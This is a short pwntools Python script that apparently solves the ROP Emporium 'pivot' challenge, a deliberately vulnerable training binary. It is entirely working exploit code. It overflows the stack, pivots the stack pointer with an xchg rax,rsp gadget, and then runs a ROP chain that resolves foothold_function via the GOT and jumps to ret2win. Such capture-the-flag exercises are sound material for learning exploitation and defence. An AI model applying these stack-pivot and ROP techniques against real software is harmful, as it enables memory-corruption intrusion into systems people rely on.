from pwn import *
from socket import *
from struct import *

elf = ELF('./pivot')
p = elf.process()

context.arch = 'amd64'
context.log_level = 'debug'

p.recvuntil('pivot: ')
pivot_add = int(p.recvline(),16)



foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']

# Smash the stack, it will return to the pivot address, where our real ROP-chain located
payload1 = b'A'*40
payload1 += p64(0x00000000004009bb) #pop rax
payload1 += p64(pivot_add)
payload1 += p64(0x00000000004009bd) #xchg rax,rsp

# ROP-chain
payload2 = p64(foothold_plt) #foothold_plt
payload2 += p64(0x00000000004009bb) #pop rax
payload2 += p64(foothold_got)
payload2 += p64(0x00000000004009c0) #mov rax, qword ptr [rax]
payload2 += p64(0x00000000004007c8) #pop rbp
payload2 += p64(279)                #offset between foothold and ret2win function
payload2 += p64(0x00000000004009c4) #add rax,rbp
payload2 += p64(0x00000000004006b0) #call rax

p.recvuntil('>')

p.sendline(payload2)

p.recvuntil('>')

p.sendline(payload1)
p.recvall()